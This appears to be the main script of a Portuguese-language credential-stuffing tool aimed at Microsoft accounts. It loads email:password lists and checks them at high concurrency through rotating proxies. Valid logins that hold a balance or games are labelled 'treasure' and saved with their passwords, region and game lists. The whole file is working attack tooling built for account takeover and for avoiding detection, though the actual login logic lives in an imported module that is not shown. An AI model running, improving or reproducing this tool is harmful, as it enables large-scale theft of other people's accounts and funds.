import asyncio
import os
import sys
import time
import json
import random
from datetime import datetime
from .logic import MicrosoftChecker, AccountLoader, ProxyLoader
from .models import LoginStatus

# Configurações de Performance
CONCURRENCY = 20 

class Colors:
    # Paleta Cyberpunk Refinada
    CYAN = "\033[38;5;45m"       # Ciano Elétrico
    GREEN = "\033[38;5;47m"      # Verde Neon (Sucesso)
    RED = "\033[38;5;196m"       # Vermelho Intenso (Erro)
    YELLOW = "\033[38;5;220m"    # Amarelo Ouro (Aura/Alerta)
    BLUE = "\033[38;5;33m"       # Azul Profundo (Hit)
    MAGENTA = "\033[38;5;165m"    # Magenta (Erros)
    WHITE = "\033[38;5;255m"     # Branco Puro
    GRAY = "\033[38;5;240m"      # Cinza Escuro (Fundo/Separador)
    GOLD = "\033[38;5;220m"      # Amarelo Ouro (Aura)
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    # Cores de Fundo (Para o cabeçalho)
    BG_CYAN = "\033[48;5;45m"
    BG_GRAY = "\033[48;5;236m"

class Stats:
    def __init__(self, total_accounts):
        self.total_to_check = total_accounts
        self.checked = 0
        self.aura = 0      
        self.hits = 0      
        self.bad = 0       
        self.blocked = 0   
        self.error = 0     
        self.start_time = time.time()

    def update(self, status, is_aura=False):
        self.checked += 1
        if is_aura:
            self.aura += 1
        elif status == LoginStatus.LOGADO:
            self.hits += 1
        elif status == LoginStatus.ERRO_CREDENCIAIS:
            self.bad += 1
        elif status == LoginStatus.SESSAO_BLOQUEADA:
            self.blocked += 1
        else:
            self.error += 1

    def get_speed(self):
        elapsed = time.time() - self.start_time
        return self.checked / elapsed if elapsed > 0 else 0

def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    # Cabeçalho Estilizado com Gradiente Simulado
    print(f"\n{Colors.CYAN}   █████╗ ██╗   ██╗██████╗  █████╗ ")
    print(f"  ██╔══██╗██║   ██║██╔══██╗██╔══██╗")
    print(f"  ███████║██║   ██║██████╔╝███████║")
    print(f"  ██╔══██║██║   ██║██╔══██╗██╔══██║")
    print(f"  ██║  ██║╚██████╔╝██║  ██║██║  ██║")
    print(f"  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Colors.RESET}")

    print(f"\n{Colors.GRAY}  {'─'*116}{Colors.RESET}")
    print(f"  {Colors.BOLD}{Colors.WHITE}{'LOG DE ATIVIDADE':<50} {Colors.GRAY}│{Colors.RESET} {Colors.BOLD}{Colors.YELLOW}{'DETALHES DAS CONTAS ENCONTRADAS (AURA)':<60}{Colors.RESET}")
    print(f"{Colors.GRAY}  {'─'*116}{Colors.RESET}")

async def process(checker, account, semaphore, stats, aura_file, json_file):
    async with semaphore:
        result = await checker.check_account(account)
        
        is_aura = False
        if result.status == LoginStatus.LOGADO:
            balance_str = str(result.balance).lower()
            if (balance_str != "n/a" and balance_str != "0.00" and "0.00" not in balance_str) or len(result.games) > 0:
                is_aura = True
        
        stats.update(result.status, is_aura)
        
        # Tags Estilizadas (Minimalistas e Modernas)
        if result.status == LoginStatus.LOGADO:
            tag = f"{Colors.YELLOW}✦ AURA{Colors.RESET}" if is_aura else f"{Colors.BLUE}✧ HIT {Colors.RESET}"
        elif result.status == LoginStatus.ERRO_CREDENCIAIS:
            tag = f"{Colors.RED}✖ BAD {Colors.RESET}"
        elif result.status == LoginStatus.SESSAO_BLOQUEADA:
            tag = f"{Colors.GRAY}🔒 LOCK{Colors.RESET}"
        else:
            tag = f"{Colors.MAGENTA}⚠ ERR {Colors.RESET}"

        left_side = f"  {tag} {Colors.WHITE}{account.email[:40]:<40}{Colors.RESET}"

        if is_aura:
            # Layout de detalhes ultra-refinado
            details = (f"{Colors.CYAN}Region: {Colors.WHITE}{result.region:<3} {Colors.GRAY}•{Colors.RESET} "
                       f"{Colors.YELLOW}Balance: {Colors.WHITE}{result.balance:<12} {Colors.GRAY}•{Colors.RESET} "
                       f"{Colors.GREEN}Games: {Colors.WHITE}{len(result.games)}{Colors.RESET}")
            
            sys.stdout.write(f"\033[K{left_side} {Colors.GRAY}│{Colors.RESET} {details}\n")
            
            aura_file.write(f"{result.email}:{result.password} | Região: {result.region} | Saldo: {result.balance} | Jogos: {', '.join(result.games)}\n")
            aura_file.flush()
        else:
            sys.stdout.write(f"\033[K{left_side} {Colors.GRAY}│{Colors.RESET}\n")

        # Exportação JSON
        res_data = {
            "email": result.email,
            "status": result.status.name,
            "region": result.region,
            "balance": result.balance,
            "games": result.games,
            "timestamp": datetime.now().isoformat()
        }
        json_file.write(json.dumps(res_data) + "\n")
        json_file.flush()

        # Barra de status ultra-moderna (Estilo Dashboard)
        speed = stats.get_speed()
        status_line = (f"  {Colors.BG_GRAY}{Colors.BOLD}{Colors.WHITE} PROGRESS {Colors.RESET} {Colors.WHITE}{stats.checked}/{stats.total_to_check}{Colors.RESET}  "
                       f"{Colors.BG_CYAN}{Colors.BOLD}{Colors.WHITE} AURA {Colors.RESET} {Colors.YELLOW}{stats.aura}{Colors.RESET}  "
                       f"{Colors.BG_GRAY}{Colors.BOLD}{Colors.WHITE} HITS {Colors.RESET} {Colors.BLUE}{stats.hits}{Colors.RESET}  "
                       f"{Colors.BG_GRAY}{Colors.BOLD}{Colors.WHITE} LOCK {Colors.RESET} {Colors.GRAY}{stats.blocked}{Colors.RESET}  "
                       f"{Colors.BG_GRAY}{Colors.BOLD}{Colors.WHITE} SPEED {Colors.RESET} {Colors.CYAN}{speed:.2f} acc/s{Colors.RESET}")
        
        # Atualiza a barra de status apenas se houver mudança significativa ou a cada 5 contas para evitar flicker
        if stats.checked % 1 == 0:
            sys.stdout.write(f"\033[s\033[999;1H\033[K{status_line}\033[u")
            sys.stdout.flush()

async def main():
    os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])) if getattr(sys.modules['__main__'], '__file__', None) else os.getcwd())

    acc_file = "accounts.txt"
    if not os.path.exists(acc_file):
        with open(acc_file, "w") as f: f.write("exemplo@outlook.com:senha123\n")
        return

    accounts = AccountLoader.load(acc_file)
    proxies = ProxyLoader.load("proxies.txt")
    
    if not accounts:
        print(f"{Colors.RED}[!] Nenhuma conta encontrada.{Colors.RESET}")
        return

    print_header()
    
    # Animação de Inicialização
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(15):
        sys.stdout.write(f"\r  {Colors.CYAN} {chars[i % len(chars)]} {Colors.WHITE}Sincronizando com servidores Microsoft...{Colors.RESET}")
        sys.stdout.flush()
        await asyncio.sleep(0.05)
    sys.stdout.write(f"\r  {Colors.GREEN} ✔ {Colors.WHITE}Conexão estabelecida com sucesso!{' '*30}\n\n{Colors.RESET}")
    
    f_aura = open("aura.txt", "a", encoding="utf-8")
    f_json = open("results.json", "a", encoding="utf-8")

    if proxies:
        sys.stdout.write(f"  {Colors.CYAN}ℹ {len(proxies)} proxies carregados. Iniciando rotação...{Colors.RESET}\n")

    semaphore = asyncio.Semaphore(CONCURRENCY)
    stats = Stats(len(accounts))

    async def worker(acc):
        # Seleciona um proxy aleatório para cada conta se disponível
        current_proxy = random.choice(proxies) if proxies else None
        async with MicrosoftChecker(proxy=current_proxy, max_connections=1) as checker:
            await process(checker, acc, semaphore, stats, f_aura, f_json)

    tasks = [worker(acc) for acc in accounts]
    
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        pass
    finally:
        f_aura.close()
        f_json.close()

    # Quadro de Resumo Final Ultra-Refinado
    w = 50
    print(f"\n\n  {Colors.BOLD}{Colors.WHITE}RESUMO DA OPERAÇÃO{Colors.RESET}")
    print(f"  {Colors.GRAY}{'─'*w}{Colors.RESET}")
    print(f"  {Colors.YELLOW}✦ AURA (Tesouro):{stats.aura:>{w-18}} {Colors.RESET}")
    print(f"  {Colors.BLUE}✧ HITS (Normais):{stats.hits:>{w-18}} {Colors.RESET}")
    print(f"  {Colors.RED}✖ BAD (Incorretas):{stats.bad:>{w-20}} {Colors.RESET}")
    print(f"  {Colors.GRAY}🔒 LOCK (Bloqueios):{stats.blocked:>{w-20}} {Colors.RESET}")
    print(f"  {Colors.MAGENTA}⚠ ERR (Erros):{stats.error:>{w-15}} {Colors.RESET}")
    print(f"  {Colors.GRAY}{'─'*w}{Colors.RESET}")
    print(f"  {Colors.BOLD}{Colors.WHITE}TOTAL VERIFICADO:{stats.checked:>{w-18}} {Colors.RESET}")
    print(f"  {Colors.GRAY}{'─'*w}{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{Colors.WHITE}[?] Deseja limpar o arquivo 'accounts.txt'?{Colors.RESET}")
    choice = input(f"  {Colors.CYAN}❯{Colors.RESET} Digite 's' para sim ou Enter para manter: ").lower().strip()
    if choice == 's':
        with open(acc_file, "w") as f: f.write("")
        print(f"  {Colors.GREEN}✔ Arquivo limpo.{Colors.RESET}")
    
    print(f"\n{Colors.GRAY}  Sessão finalizada. Tesouro em aura.txt{Colors.RESET}")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
